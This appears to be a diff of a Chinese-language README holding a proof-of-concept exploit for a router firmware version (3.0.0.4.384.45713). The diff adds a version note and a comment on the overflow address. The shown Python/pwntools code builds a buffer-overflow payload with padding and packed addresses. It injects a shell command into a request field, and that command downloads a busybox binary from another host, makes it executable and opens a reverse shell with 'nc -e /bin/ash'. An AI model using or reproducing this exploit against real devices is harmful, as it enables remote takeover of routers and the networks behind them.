@@ -74,11 +74,12 @@ atol(1639469133aaaaaaa.....)返回内容为1639469133,所以只需要在计算�
   [![Watch the video](https://raw.github.com/GabLeRoux/WebMole/master/ressources/WebMole_Youtube_Video.png)](https://youtu.be/9rpNKSVQtFM)
   
 # POC 
+争对3.0.0.4.384.45713固件版本的POC
 <sup> 
 
 
   
-  
+    
     #coding=utf-8
     from pwn import *
     import re
@@ -166,8 +167,8 @@ atol(1639469133aaaaaaa.....)返回内容为1639469133,所以只需要在计算�
         data2 ={
             'CName': 'cd /tmp/home/root;wget http://192.168.2.177:8080/busybox-armv6l;chmod 777 *;./busybox-armv6l nc 192.168.2.177:1234 -e /bin/ash',
             'mac': '',
-            'interval': 'a'*12+p32(1)+'a'*16+p32(0x0000EFA8),
-            'timestap': timeStapStr +'a'*4740+p32(0x0006FE35),
+            'interval': 'a'*12+p32(1)+'a'*16+p32(0x0000EFA8),   
+            'timestap': timeStapStr +'a'*4740+p32(0x0006FE35),   #p32(addr) 此addr为interval参数内容首地址
 
         }
         ret = requests.post(url = url ,
